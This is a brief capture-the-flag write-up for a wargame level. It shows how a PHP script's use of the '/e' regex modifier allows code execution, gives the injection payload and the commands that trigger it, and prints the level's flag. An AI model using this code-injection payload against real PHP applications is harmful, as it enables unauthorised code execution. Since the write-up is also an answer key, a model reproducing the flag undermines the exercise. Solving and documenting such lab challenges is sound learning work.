# Level 06

This exercice is about exploiting a php script that uses `/e` in a regular expressions which allows us to execute code.

`echo '[x {${exec(getflag)}}]' > /tmp/tata`
<br>
`chmod +r /tmp/tata`
<br>
`./level06 /tmp/tata`

**Flag:** `wiok45aaoguiboiki2tuin6ub`
